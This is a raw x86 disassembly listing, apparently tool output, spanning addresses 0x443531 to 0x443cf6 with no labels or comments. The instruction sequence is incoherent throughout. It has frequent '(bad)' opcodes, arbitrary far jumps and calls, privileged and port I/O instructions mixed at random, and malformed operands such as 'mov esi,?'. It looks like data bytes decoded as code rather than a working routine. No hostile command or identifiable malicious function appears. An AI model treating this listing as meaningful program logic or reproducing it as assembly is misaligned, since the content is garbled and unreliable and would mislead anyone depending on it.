  443531:	test   BYTE PTR [ebp+0x48],ch
  443534:	sbb    al,0xc2
  443536:	xchg   ecx,eax
  443537:	rol    BYTE PTR [edx],1
  443539:	adc    dl,dl
  44353b:	int3   
  44353c:	or     al,0xad
  44353e:	push   0x85a9a58
  443543:	pop    ecx
  443544:	les    eax,FWORD PTR [ebx-0x4a]
  443547:	pop    esi
  443548:	add    ebp,DWORD PTR [edi-0x31f845dc]
  44354e:	and    al,0xe8
  443550:	mov    gs,WORD PTR [ebp+0x5e245fb5]
  443556:	cli    
  443557:	mov    BYTE PTR [ecx+ebp*2],al
  44355a:	loop   0x4434e0
  44355c:	mov    eax,0xeab006da
  443561:	dec    ebx
  443562:	pop    esp
  443563:	test   al,0x24
  443565:	lds    eax,FWORD PTR [esi-0x20f2ba60]
  44356b:	and    cl,cl
  44356d:	sbb    bl,BYTE PTR [ecx]
  44356f:	cmp    BYTE PTR [ecx+0x323c25a],bl
  443575:	scas   eax,DWORD PTR es:[edi]
  443576:	mov    ss,WORD PTR [eax-0x303707c2]
  44357c:	jp     0x443580
  44357e:	pop    esi
  44357f:	adc    esp,eax
  443581:	xchg   edi,eax
  443582:	into   
  443583:	pusha  
  443584:	inc    esi
  443585:	sbb    BYTE PTR [ebx+0x4660542a],bl
  44358b:	mov    ebp,0x5e6ede40
  443590:	sbb    edx,eax
  443592:	das    
  443593:	dec    edx
  443594:	adc    edx,edi
  443596:	adc    cl,BYTE PTR [eax]
  443598:	dec    eax
  443599:	push   ds
  44359a:	pusha  
  44359b:	loope  0x4435d2
  44359d:	sahf   
  44359e:	(bad)  
  44359f:	idiv   al
  4435a1:	mov    edi,0x12c4dad1
  4435a6:	retf   0x7970
  4435a9:	gs test bh,dl
  4435ac:	nop
  4435ad:	push   ds
  4435ae:	pop    esp
  4435af:	ret    0xe06
  4435b2:	arpl   WORD PTR [ecx],ax
  4435b4:	push   edi
  4435b5:	mov    cl,0x88
  4435b7:	adc    ecx,DWORD PTR [esi+0x18]
  4435ba:	std    
  4435bb:	stos   BYTE PTR es:[edi],al
  4435bc:	js     0x443626
  4435be:	and    DWORD PTR [eax+0x18],0x296084d0
  4435c5:	xchg   esp,eax
  4435c6:	push   ds
  4435c7:	mov    al,BYTE PTR [ecx]
  4435c9:	adc    al,0x90
  4435cb:	sahf   
  4435cc:	sub    ecx,DWORD PTR [eax-0x59]
  4435cf:	push   es
  4435d0:	or     bh,al
  4435d2:	mov    dl,0x58
  4435d4:	inc    DWORD PTR [esp+eax*2]
  4435d7:	add    eax,0xd0e65ed1
  4435dc:	scas   eax,DWORD PTR es:[edi]
  4435dd:	cmp    BYTE PTR [ebx-0x80],0xec
  4435e1:	rcl    DWORD PTR [edx-0x3e],1
  4435e4:	inc    esp
  4435e5:	sub    al,0x95
  4435e7:	inc    eax
  4435e8:	je     0x4435f4
  4435ea:	pop    ss
  4435eb:	stos   BYTE PTR es:[edi],al
  4435ec:	or     BYTE PTR [esi],dl
  4435ee:	lods   al,BYTE PTR ds:[esi]
  4435ef:	adc    dh,dl
  4435f1:	add    DWORD PTR [edx],0xffffffb7
  4435f4:	lock ins DWORD PTR es:[edi],dx
  4435f6:	bound  edx,QWORD PTR [ecx-0x2a]
  4435f9:	pusha  
  4435fa:	mov    cl,0x1d
  4435fc:	add    eax,0x1a0481e3
  443602:	sbb    al,0x53
  443604:	or     ch,BYTE PTR ds:0x6c24fd80
  44360a:	pop    ecx
  44360b:	stos   BYTE PTR es:[edi],al
  44360c:	push   0x3a
  44360e:	(bad)  
  44360f:	ja     0x443654
  443611:	test   DWORD PTR [esi],ebx
  443613:	inc    ebp
  443614:	and    BYTE PTR [ebx+0x73da021c],dl
  44361a:	xor    al,0x75
  44361c:	xor    al,0x28
  44361e:	push   edx
  44361f:	jmp    0xcaa:0x243b7078
  443626:	mov    esp,0xfd920530
  44362b:	cmp    al,0x90
  44362d:	pop    esi
  44362e:	call   0xc28d90e4
  443633:	retf   0x4ce7
  443636:	ror    BYTE PTR [esp+eax*4],1
  443639:	psadbw mm5,QWORD PTR [ecx+0x6]
  44363d:	mov    DWORD PTR [edi+ebx*1-0x6c],esp
  443641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443642:	sub    BYTE PTR [eax],dh
  443644:	push   es
  443645:	sar    dl,0x94
  443648:	add    bl,BYTE PTR [edx+0x652850a6]
  44364e:	jge    0x4436a8
  443650:	lock shr dl,0x32
  443654:	les    ebp,FWORD PTR [ebx]
  443656:	dec    esp
  443657:	add    esi,DWORD PTR [eax-0x17baa6b9]
  44365d:	cdq    
  44365e:	popa   
  44365f:	data16 test BYTE PTR [eax-0x3d707e79],ah
  443666:	push   0xffffffb9
  443668:	fs sahf 
  44366a:	fst    DWORD PTR [edx]
  44366c:	pop    ss
  44366d:	mov    esi,0xca30e104
  443672:	pop    esi
  443673:	fsubr  DWORD PTR [esp+edi*8+0x34]
  443677:	sub    al,BYTE PTR ds:0x4218fe8a
  44367d:	or     BYTE PTR [edi+0xc157441],0xb
  443684:	sahf   
  443685:	and    eax,0xa8c6c9a0
  44368a:	inc    edi
  44368b:	inc    edx
  44368c:	push   0xcc8e8bd6
  443691:	imul   edx,esi,0x6d
  443694:	sub    BYTE PTR [esi-0x44],ah
  443697:	and    ch,BYTE PTR [esp+edi*2-0x70162901]
  44369e:	and    eax,0xf857c160
  4436a3:	mov    edx,0xe93a002e
  4436a8:	inc    ebp
  4436a9:	mov    cl,0xf4
  4436ab:	popa   
  4436ac:	call   0x2dcd:0x28cbaef2
  4436b3:	adc    al,0x34
  4436b5:	inc    eax
  4436b6:	ja     0x4436fa
  4436b8:	sub    eax,0x363610ac
  4436bd:	js     0x443700
  4436bf:	ins    BYTE PTR es:[edi],dx
  4436c0:	mov    BYTE PTR [edi+0x76],bl
  4436c3:	mov    esi,0x9773a156
  4436c8:	add    DWORD PTR [edi],eax
  4436ca:	hlt    
  4436cb:	add    eax,DWORD PTR [edx]
  4436cd:	inc    edx
  4436ce:	int    0x37
  4436d0:	cmp    bl,BYTE PTR [ecx+0x8e21d44]
  4436d6:	ret    0x903e
  4436d9:	test   al,0x87
  4436db:	mov    DWORD PTR [ecx],esp
  4436dd:	mov    ah,0x16
  4436df:	sahf   
  4436e0:	dec    edx
  4436e1:	mov    al,0xfa
  4436e3:	pop    edx
  4436e4:	xchg   DWORD PTR [eax+0x6664e256],edx
  4436ea:	out    0xfa,eax
  4436ec:	sbb    BYTE PTR [edx-0x15f4e499],al
  4436f2:	dec    edi
  4436f3:	or     BYTE PTR [edx],dh
  4436f5:	loopne 0x443715
  4436f7:	mov    al,ds:0x16d648e3
  4436fc:	and    cl,BYTE PTR [esi-0x75]
  4436ff:	jle    0x443704
  443701:	sbb    BYTE PTR [esi],0xad
  443704:	mov    dh,0x48
  443706:	or     eax,0xcad2a029
  44370b:	cmp    eax,DWORD PTR [ebx+0x3b]
  44370e:	or     cl,BYTE PTR [esi+esi*1+0x36]
  443712:	repz ror cl,cl
  443715:	lods   eax,DWORD PTR ds:[esi]
  443716:	sbb    DWORD PTR [esi+0x13],edi
  443719:	idiv   esp
  44371b:	or     BYTE PTR [ecx],bh
  44371d:	push   edx
  44371e:	ficomp WORD PTR [ebp+0x36686e9b]
  443724:	sbb    DWORD PTR ds:0x8acd4652,eax
  44372a:	mov    esi,0x423e0090
  44372f:	cwde   
  443730:	aaa    
  443731:	adc    DWORD PTR [eax+0x47],ebp
  443734:	add    dh,al
  443736:	cmp    al,0xdb
  443738:	sbb    DWORD PTR [esi-0x58],edx
  44373b:	mov    BYTE PTR [ebp-0x3a],ch
  44373e:	dec    edi
  44373f:	pop    edx
  443740:	data16 and BYTE PTR [edx-0x4e],al
  443744:	and    DWORD PTR [esi+edx*2],ebx
  443747:	fs jmp 0x443765
  44374a:	jmp    0x33e9:0x4c7b1605
  443751:	adc    BYTE PTR [ebp+0x36],0xe9
  443755:	fdivr  QWORD PTR [esi]
  443757:	xchg   ebx,eax
  443758:	in     eax,dx
  443759:	mov    eax,ds:0x684dfb59
  44375e:	stc    
  44375f:	pop    es
  443760:	jl     0x44376e
  443762:	retf   0xe570
  443765:	cli    
  443766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443767:	dec    ebp
  443768:	push   es
  443769:	inc    edx
  44376a:	push   0x2b
  44376c:	lahf   
  44376d:	sub    al,0x1f
  44376f:	call   0x127c548d
  443774:	mov    ch,BYTE PTR [esp+ebp*1+0x68432bc]
  44377b:	pop    esi
  44377c:	fcmovnbe st,st(2)
  44377e:	mov    cl,0xee
  443780:	mulps  xmm7,XMMWORD PTR [edi]
  443783:	add    al,0xf2
  443785:	or     ch,BYTE PTR [edx+0x4c]
  443788:	fs pop esi
  44378a:	push   ebp
  44378b:	test   BYTE PTR [ecx+0x42],ch
  44378e:	je     0x44373e
  443790:	retf   0x9200
  443793:	and    BYTE PTR [edx+edx*1+0x60],ah
  443797:	push   ss
  443798:	mov    ds:0x28434fc0,al
  44379d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44379e:	pop    sp
  4437a0:	push   ss
  4437a1:	or     ecx,DWORD PTR [edi+0x26d2c24f]
  4437a7:	sahf   
  4437a8:	sbb    eax,0x10f49016
  4437ad:	add    al,0x3e
  4437af:	add    dl,bl
  4437b1:	mov    ds:0x9f47e148,eax
  4437b6:	ins    BYTE PTR es:[edi],dx
  4437b7:	jl     0x44375b
  4437b9:	popw   es
  4437bb:	and    bh,dl
  4437bd:	sub    eax,DWORD PTR [edx-0x3d]
  4437c0:	popa   
  4437c1:	pop    ebp
  4437c2:	or     al,BYTE PTR [eax]
  4437c4:	push   esi
  4437c5:	inc    esi
  4437c6:	or     DWORD PTR [esp+edx*4-0x50],edi
  4437ca:	test   BYTE PTR [esi-0x5229fb17],cl
  4437d0:	fldenv [ebx+0x19]
  4437d3:	mov    ebx,cr4
  4437d6:	je     0x443840
  4437d8:	inc    edx
  4437d9:	adc    eax,0x986d097c
  4437de:	and    esi,ebx
  4437e0:	push   ss
  4437e1:	in     eax,dx
  4437e2:	adc    DWORD PTR [esi+esi*2],0xffffff86
  4437e6:	(bad)  
  4437e7:	sti    
  4437e8:	push   cs
  4437e9:	es cs xor ecx,edx
  4437ed:	js     0x443777
  4437ef:	add    eax,0x7ab0539c
  4437f4:	lds    ebp,FWORD PTR [ebx+0x66]
  4437f7:	inc    ecx
  4437f8:	imul   esp,ebx,0x9c808d9e
  4437fe:	xchg   ecx,eax
  4437ff:	js     0x443805
  443801:	mov    ah,0x45
  443803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443804:	jo     0x443794
  443806:	retf   
  443807:	push   edx
  443808:	sbb    cl,BYTE PTR [edi+0x72f0f082]
  44380e:	dec    edx
  44380f:	cmp    BYTE PTR [eax+0x49],ch
  443812:	adc    BYTE PTR [eax-0x2fb7ed8b],ah
  443818:	aas    
  443819:	jo     0x44384b
  44381b:	call   0x3122:0xf4e09452
  443822:	inc    eax
  443823:	call   0x5ae0dd28
  443828:	adc    edx,DWORD PTR [esi]
  44382a:	mov    ch,0x6
  44382c:	adc    ecx,DWORD PTR [eax+eax*1]
  44382f:	dec    edx
  443830:	stos   DWORD PTR es:[edi],eax
  443831:	mov    gs,ecx
  443833:	xchg   BYTE PTR [ebx+0x3a],ch
  443836:	push   0x33
  443838:	cmp    al,0x86
  44383a:	dec    esp
  44383b:	mov    ah,0x97
  44383d:	mov    WORD PTR [esi],gs
  44383f:	cli    
  443840:	cmp    al,dl
  443842:	ss sti 
  443844:	sub    esp,ecx
  443846:	addr16 mov eax,gs
  443849:	(bad)  
  44384b:	fsub   st,st(2)
  44384d:	mov    dh,0x6b
  44384f:	ins    BYTE PTR es:[edi],dx
  443850:	xchg   DWORD PTR [edx],esp
  443852:	ret    0x5682
  443855:	xchg   ebp,eax
  443856:	loopne 0x44384a
  443858:	or     BYTE PTR [edi+0x62a5aec6],0xcf
  44385f:	nop
  443860:	xchg   edx,eax
  443861:	imul   esi,DWORD PTR [ecx+0x41],0xd
  443865:	ret    0xa21
  443868:	cwde   
  443869:	pusha  
  44386a:	imul   eax,DWORD PTR [ecx],0xffffff87
  44386d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44386e:	sub    edx,eax
  443870:	fild   QWORD PTR [ebp+esi*4-0x57fca65e]
  443877:	dec    esi
  443878:	(bad)  
  443879:	les    eax,FWORD PTR [edx+0x294b7b70]
  44387f:	mov    ds:0x84ca6bd,eax
  443884:	inc    ebx
  443885:	mov    ch,bh
  443887:	push   ss
  443888:	cmp    al,BYTE PTR [esi+esi*8]
  44388b:	jmp    0xa021:0x66942e90
  443892:	push   cs
  443893:	mov    BYTE PTR [edi],dl
  443895:	ins    BYTE PTR es:[edi],dx
  443896:	pop    ds
  443897:	dec    esp
  443898:	push   ds
  443899:	aam    0xd0
  44389b:	imul   edx,DWORD PTR [ebx-0x23],0xffffff8a
  44389f:	inc    edx
  4438a0:	add    al,0xab
  4438a2:	das    
  4438a3:	adc    BYTE PTR [edx],ah
  4438a5:	or     cl,BYTE PTR [edi+0x352c0352]
  4438ab:	push   ss
  4438ac:	test   DWORD PTR [edx],ecx
  4438ae:	loopne 0x443847
  4438b0:	jg     0x4438cc
  4438b2:	xor    al,0xb3
  4438b4:	jno    0x44391e
  4438b6:	clc    
  4438b7:	loope  0x443847
  4438b9:	xor    DWORD PTR cs:[edi+0xc15b086],edx
  4438c0:	test   DWORD PTR [eax-0x4d],eax
  4438c3:	ins    BYTE PTR es:[edi],dx
  4438c4:	add    dl,BYTE PTR [edx]
  4438c6:	sahf   
  4438c7:	test   al,0x6
  4438c9:	adc    bh,BYTE PTR [edx]
  4438cb:	mov    ah,BYTE PTR [esi+0x1a]
  4438ce:	mov    ds:0x9ad890f1,eax
  4438d3:	jmp    0x44388a
  4438d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4438d6:	loopne 0x4438a4
  4438d8:	ds pop ebp
  4438da:	ss ins BYTE PTR es:[edi],dx
  4438dc:	ret    
  4438dd:	outs   dx,DWORD PTR ds:[esi]
  4438de:	sbb    dh,BYTE PTR [esi+0x17]
  4438e1:	loop   0x44388d
  4438e3:	lahf   
  4438e4:	sbb    BYTE PTR [esi],0xcb
  4438e7:	push   0x5c7a674c
  4438ec:	mov    cl,0xa8
  4438ee:	sub    ch,BYTE PTR [edx+0x4f]
  4438f1:	test   BYTE PTR [edi-0x7e],dl
  4438f4:	lea    ebp,[esi+eax*1]
  4438f7:	dec    eax
  4438f8:	add    ebx,esp
  4438fa:	add    eax,0x7ffe6c24
  4438ff:	mov    dl,0x72
  443901:	or     eax,0x2ab080
  443906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443907:	shl    BYTE PTR [edx-0x40e35440],0x40
  44390e:	push   esp
  44390f:	or     dh,bl
  443911:	cmp    ah,bh
  443913:	mov    edi,0x2f8ec0f3
  443918:	adc    BYTE PTR [esi],al
  44391a:	gs or  al,0x5d
  44391d:	and    al,0x5b
  44391f:	add    ch,cl
  443921:	cmp    DWORD PTR [edx],0x55
  443924:	sbb    BYTE PTR [edx],bl
  443926:	push   eax
  443927:	push   edi
  443928:	xor    eax,DWORD PTR [edx+eax*4+0x29611a3c]
  44392f:	or     BYTE PTR [ebx-0x69],bl
  443932:	sub    dl,BYTE PTR [esi-0x7a]
  443935:	hlt    
  443936:	int3   
  443937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443938:	lock nop
  44393a:	inc    eax
  44393b:	sti    
  44393c:	cld    
  44393d:	cmp    eax,0x44521c3c
  443942:	push   esp
  443943:	push   ss
  443944:	cs push ebx
  443946:	(bad)  
  443947:	xor    BYTE PTR [eax-0x3e],al
  44394a:	mov    dh,0xc1
  44394c:	or     DWORD PTR ds:0x32665aa9,edi
  443952:	mov    al,ds:0x4c996150
  443957:	xor    al,0x1a
  443959:	push   0xbc019e0a
  44395e:	mov    dl,0xff
  443960:	(bad)  
  443961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443962:	xchg   edi,eax
  443963:	mov    bx,0x7e34
  443967:	dec    ebx
  443968:	fdivr  DWORD PTR [edx]
  44396a:	fst    QWORD PTR [ebp-0x30]
  44396d:	icebp  
  44396e:	jne    0x4439b9
  443970:	lahf   
  443971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443972:	pop    ds
  443973:	fs popf 
  443975:	mov    esi,0xa1585574
  44397a:	std    
  44397b:	push   es
  44397c:	cmp    BYTE PTR ds:[ebx-0x59],0xb0
  443981:	mov    al,ds:0xd536b857
  443986:	mov    dh,BYTE PTR [eax+0x20]
  443989:	push   ss
  44398a:	push   0xd1bef548
  44398f:	ret    0x192b
  443992:	lahf   
  443993:	push   eax
  443994:	jo     0x4439a5
  443996:	xor    ch,BYTE PTR [ecx]
  443998:	test   BYTE PTR [edx],0x68
  44399b:	neg    bl
  44399d:	je     0x4439fa
  44399f:	lahf   
  4439a0:	fsubr  QWORD PTR [edx-0x5]
  4439a3:	mov    ebp,DWORD PTR [esi]
  4439a5:	push   0x54fea0
  4439aa:	mov    ecx,esi
  4439ac:	jae    0x4439e5
  4439ae:	leave  
  4439af:	js     0x4439b6
  4439b1:	add    BYTE PTR [eax+eax*4+0x4a],ah
  4439b5:	test   DWORD PTR ds:0x1cac7c2a,edx
  4439bb:	hlt    
  4439bc:	hlt    
  4439bd:	and    bl,BYTE PTR [eax]
  4439bf:	and    eax,0x54067c29
  4439c4:	cmp    DWORD PTR [ebp-0x72],ebx
  4439c7:	xchg   esp,eax
  4439c8:	lock add ebx,ebx
  4439cb:	gs pop eax
  4439cd:	pop    esp
  4439ce:	mov    bl,0x34
  4439d0:	stc    
  4439d1:	cmp    eax,0x3849a17d
  4439d6:	push   0x7836da14
  4439db:	mov    ecx,DWORD PTR ds:0xb401a846
  4439e1:	jo     0x4439c9
  4439e3:	mov    esp,0x1d0d0515
  4439e8:	jmp    0x9a07:0x9cc486e5
  4439ef:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4439f1:	sar    BYTE PTR [ebx+ebp*2+0x76],1
  4439f5:	enter  0x2240,0xe6
  4439f9:	add    bh,dl
  4439fb:	add    al,0xb8
  4439fd:	gs stos BYTE PTR es:[edi],al
  4439ff:	inc    edx
  443a00:	clc    
  443a01:	repnz bound esi,QWORD PTR fs:[esi-0x79]
  443a06:	push   esi
  443a07:	push   ecx
  443a08:	jo     0x4439f4
  443a0a:	jne    0x4439c6
  443a0c:	and    eax,0x3816a746
  443a11:	enter  0x44bf,0xec
  443a15:	mov    al,0x2
  443a17:	add    al,0x36
  443a19:	fs and eax,0x527ef468
  443a1f:	sti    
  443a20:	or     DWORD PTR fs:[esi-0x2f],ecx
  443a24:	pop    edx
  443a25:	cmp    ah,BYTE PTR [ecx+esi*2]
  443a28:	mov    esi,?
  443a2a:	add    BYTE PTR [ebp+edi*8+0x78],0x46
  443a2f:	ret    
  443a30:	mov    esi,0xa5a4a5e7
  443a35:	mov    al,0xa0
  443a37:	cwde   
  443a38:	daa    
  443a39:	inc    edx
  443a3a:	sub    BYTE PTR [esi+0x2280659c],ah
  443a40:	sbb    dl,BYTE PTR [edi]
  443a42:	sar    ah,1
  443a44:	popf   
  443a45:	push   esi
  443a46:	les    edi,FWORD PTR [esi+0x9]
  443a49:	mov    esp,0xacc80d85
  443a4e:	cwde   
  443a4f:	mov    al,ds:0x8b4a43d0
  443a54:	mov    dl,0xa9
  443a56:	test   eax,0x15575336
  443a5b:	add    esi,esi
  443a5d:	adc    DWORD PTR [edx+0x6a1c889e],edx
  443a63:	ror    DWORD PTR [edx],cl
  443a65:	sbb    ebx,DWORD PTR [esi+0x50148405]
  443a6b:	cdq    
  443a6c:	into   
  443a6d:	rol    BYTE PTR [edx],0xc7
  443a70:	sub    ebp,DWORD PTR [ebp+edx*4-0x26]
  443a74:	or     al,0xae
  443a76:	pop    ebx
  443a77:	sahf   
  443a78:	test   BYTE PTR [esi-0x1e67ae1d],dh
  443a7e:	mov    edx,0x72faf723
  443a83:	scas   al,BYTE PTR es:[edi]
  443a84:	inc    eax
  443a85:	std    
  443a86:	xor    al,al
  443a88:	push   esp
  443a89:	push   0x12
  443a8b:	xchg   edi,eax
  443a8c:	mov    dh,0x67
  443a8e:	dec    ebx
  443a8f:	stos   DWORD PTR es:[edi],eax
  443a90:	and    al,0xd3
  443a92:	push   esp
  443a93:	nop
  443a94:	pop    eax
  443a95:	sub    dh,dh
  443a97:	ss mov dh,0xe1
  443a9a:	pop    ecx
  443a9b:	add    cl,BYTE PTR [ebx+esi*4+0xe]
  443a9f:	ret    0x76f4
  443aa2:	dec    eax
  443aa3:	and    DWORD PTR [eax+0x7656ca68],ebp
  443aa9:	leave  
  443aaa:	cld    
  443aab:	push   cs
  443aac:	dec    ebp
  443aad:	adc    al,0xd8
  443aaf:	pop    es
  443ab0:	ss mov esp,0xf19ce863
  443ab6:	aam    0x8
  443ab8:	mov    eax,ds:0xe0c4b289
  443abd:	clc    
  443abe:	push   ecx
  443abf:	popa   
  443ac0:	adc    edi,DWORD PTR [edx+esi*4-0x2c]
  443ac4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  443ac6:	data16 add al,0x4d
  443ac9:	daa    
  443aca:	addr16 add bh,al
  443acd:	dec    esp
  443ace:	je     0x443a76
  443ad0:	stc    
  443ad1:	push   0xfffffff4
  443ad3:	add    ebx,edx
  443ad5:	icebp  
  443ad6:	daa    
  443ad7:	or     DWORD PTR [eax],eax
  443ad9:	lahf   
  443ada:	sub    al,bh
  443adc:	dec    ebp
  443add:	inc    eax
  443ade:	mov    ds:0xba2d090a,eax
  443ae3:	adc    cl,BYTE PTR [edx]
  443ae5:	iret   
  443ae6:	push   eax
  443ae7:	xchg   ecx,eax
  443ae8:	sub    al,cl
  443aea:	mov    esp,0x3d759d00
  443aef:	dec    esp
  443af0:	cmc    
  443af1:	add    bh,ch
  443af3:	fist   WORD PTR [edx-0x67527ee2]
  443af9:	xchg   DWORD PTR [edx],esp
  443afb:	bound  ebp,QWORD PTR [eax]
  443afd:	push   eax
  443afe:	enter  0x2adb,0xaa
  443b02:	sub    BYTE PTR [edx-0x4c],ah
  443b05:	and    dl,ah
  443b07:	and    BYTE PTR [ecx+0x7db483e1],bl
  443b0d:	and    bl,bl
  443b0f:	jl     0x443aea
  443b11:	fwait
  443b12:	xchg   edx,eax
  443b13:	mov    ds:0x2f534377,al
  443b18:	and    DWORD PTR [eax],edx
  443b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443b1b:	dec    edx
  443b1c:	jl     0x443acb
  443b1e:	int    0x9b
  443b20:	mov    es,WORD PTR [ecx-0x21fde4a0]
  443b26:	add    BYTE PTR [edx-0x5529ce71],ch
  443b2c:	in     al,dx
  443b2d:	adc    eax,edi
  443b2f:	inc    ecx
  443b30:	jp     0x443b5a
  443b32:	(bad)  
  443b34:	call   0xc682:0xedb010df
  443b3b:	(bad)  
  443b3c:	cdq    
  443b3d:	stos   BYTE PTR es:[edi],al
  443b3e:	ins    DWORD PTR es:[edi],dx
  443b3f:	push   ss
  443b40:	fmul   QWORD PTR [eax-0x24]
  443b43:	js     0x443b91
  443b45:	stos   DWORD PTR es:[edi],eax
  443b46:	inc    eax
  443b47:	dec    esp
  443b48:	cld    
  443b49:	pusha  
  443b4a:	inc    ebx
  443b4b:	mov    al,ds:0x9c4451d
  443b50:	jb     0x443ba2
  443b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443b53:	mov    edx,0x95d210ea
  443b58:	lea    edx,[eax+esi*1]
  443b5b:	xchg   ebp,eax
  443b5c:	xor    al,0xda
  443b5e:	imul   ebp,DWORD PTR [ecx+0x1b8239e0],0xffffff9e
  443b65:	push   0x27
  443b67:	mov    al,ds:0x7a1768da
  443b6c:	xor    eax,0x9d42e110
  443b71:	pop    es
  443b72:	dec    ecx
  443b73:	pop    DWORD PTR [ecx]
  443b75:	and    al,BYTE PTR [esi]
  443b77:	imul   edx,esp,0xffffff9f
  443b7a:	inc    eax
  443b7b:	xchg   ebx,eax
  443b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443b7d:	pop    ecx
  443b7e:	push   esi
  443b7f:	mov    eax,0x4946af7e
  443b84:	inc    esi
  443b85:	push   edx
  443b86:	mov    ?,esi
  443b88:	add    ebp,ebp
  443b8a:	daa    
  443b8b:	mov    DWORD PTR [ecx],eax
  443b8d:	nop
  443b8e:	dec    esi
  443b8f:	mov    DWORD PTR [eax-0x74],ebx
  443b92:	pop    edx
  443b93:	daa    
  443b94:	mov    BYTE PTR [ebx+0x66],al
  443b97:	ror    esi,0x83
  443b9a:	push   edx
  443b9b:	push   cs
  443b9c:	push   0xda86bda0
  443ba1:	pop    esp
  443ba2:	sub    ch,BYTE PTR [edx-0x50]
  443ba5:	mov    cl,0xe2
  443ba7:	add    DWORD PTR [edx-0xc],edi
  443baa:	out    0xb0,al
  443bac:	ins    BYTE PTR es:[edi],dx
  443bad:	inc    edx
  443bae:	call   0xbe8935
  443bb3:	jecxz  0x443b46
  443bb5:	inc    eax
  443bb6:	shl    BYTE PTR [esi+0x5dfc3e12],1
  443bbc:	add    bh,BYTE PTR [ebp-0x6e]
  443bbf:	aam    0xd9
  443bc1:	test   dh,ah
  443bc3:	daa    
  443bc4:	jle    0x443bd7
  443bc6:	push   0x8f001ffe
  443bcb:	pusha  
  443bcc:	add    BYTE PTR [eax],bl
  443bce:	and    DWORD PTR [ebp+0x4e],eax
  443bd1:	ficom  DWORD PTR [eax+eax*1+0x60264618]
  443bd8:	jmp    0xc474:0x8f1d412b
  443bdf:	adc    eax,0x18a6d454
  443be4:	add    bh,BYTE PTR [edx-0x20c3ca77]
  443bea:	mov    esp,ss
  443bec:	xor    ecx,esi
  443bee:	shr    BYTE PTR [eax],cl
  443bf0:	fcomp  DWORD PTR [edx-0x68]
  443bf3:	cmp    BYTE PTR ds:0x2ab6685b,bl
  443bf9:	sbb    BYTE PTR [esi-0x72ca1fde],0xad
  443c00:	call   0x69d4:0x252a2e46
  443c07:	sbb    eax,0x447a0e96
  443c0c:	xchg   esi,eax
  443c0d:	in     eax,dx
  443c0e:	stos   BYTE PTR es:[edi],al
  443c0f:	sbb    cl,BYTE PTR [esi*1-0x15679778]
  443c16:	stos   BYTE PTR es:[edi],al
  443c17:	cs sub al,0x30
  443c1a:	add    eax,0x5c76263f
  443c1f:	xchg   esi,eax
  443c20:	cli    
  443c21:	in     al,0x21
  443c23:	sbb    ecx,DWORD PTR [ecx]
  443c25:	push   ss
  443c26:	mov    gs,WORD PTR [edx+ecx*8]
  443c29:	mov    esi,0xa06de965
  443c2e:	sub    BYTE PTR [ebx-0x6b17f7ac],cl
  443c34:	aad    0x1e
  443c36:	mov    ch,0x74
  443c38:	cmp    BYTE PTR [ecx],cl
  443c3a:	inc    eax
  443c3b:	mov    BYTE PTR [edi-0x4],al
  443c3e:	das    
  443c3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443c40:	test   bh,dl
  443c42:	push   es
  443c43:	or     ch,BYTE PTR [edx]
  443c45:	push   eax
  443c46:	or     ah,BYTE PTR [ebp-0x389fbacd]
  443c4c:	mov    bl,0x72
  443c4e:	sahf   
  443c4f:	or     al,0x7f
  443c51:	sahf   
  443c52:	loopne 0x443c64
  443c54:	aad    0x1e
  443c56:	mov    es,WORD PTR [eax+eax*2]
  443c59:	mov    ebx,0x54d0e0bc
  443c5e:	add    eax,0x982277de
  443c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443c64:	push   edx
  443c65:	cmp    BYTE PTR [ecx],cl
  443c67:	(bad)  
  443c68:	fadd   QWORD PTR [edx]
  443c6a:	hlt    
  443c6b:	sub    al,0x68
  443c6d:	xchg   DWORD PTR [edx],eax
  443c6f:	cwde   
  443c70:	(bad)  
  443c71:	out    dx,al
  443c72:	mov    al,0x58
  443c74:	loopne 0x443c06
  443c76:	icebp  
  443c77:	jmp    0xc008:0x4818f2bd
  443c7e:	push   esi
  443c7f:	pop    ebp
  443c80:	fcmovne st,st(2)
  443c82:	(bad)  
  443c83:	in     al,0x13
  443c85:	inc    edx
  443c86:	push   edx
  443c87:	loopne 0x443c10
  443c89:	shr    DWORD PTR ds:0x930e3292,1
  443c8f:	js     0x443c14
  443c91:	fimul  DWORD PTR [esi+0x7c0f9e2c]
  443c97:	inc    esp
  443c98:	mov    ah,0xa
  443c9a:	sub    BYTE PTR [eax-0xdc519c2],ch
  443ca0:	mov    edx,0x1d0509a8
  443ca5:	inc    edi
  443ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443ca7:	enter  0x7872,0x50
  443cab:	push   es
  443cac:	mov    BYTE PTR [ebx+0x2c],bh
  443caf:	xor    eax,0xb47e7e5b
  443cb4:	mov    al,0xcd
  443cb6:	inc    esi
  443cb7:	leave  
  443cb8:	imul   edx,DWORD PTR ds:0x96abb834,0x152c8a5
  443cc2:	add    eax,0xe31ec442
  443cc7:	mov    esp,0xdd435a81
  443ccc:	in     al,0x1d
  443cce:	adc    al,0x7d
  443cd0:	adc    cl,0x36
  443cd3:	sub    BYTE PTR [ebp-0x413c4d9e],cl
  443cd9:	mov    dh,0xee
  443cdb:	test   DWORD PTR [edx],esi
  443cdd:	push   cs
  443cde:	push   0xb254fd78
  443ce3:	inc    ebp
  443ce4:	or     eax,0x183a5ad6
  443ce9:	pop    ebp
  443cea:	xor    ch,BYTE PTR [edx]
  443cec:	inc    edi
  443ced:	shl    DWORD PTR [ebx+0x1b183c81],0x30
  443cf4:	js     0x443d38
  443cf6:	inc    edx
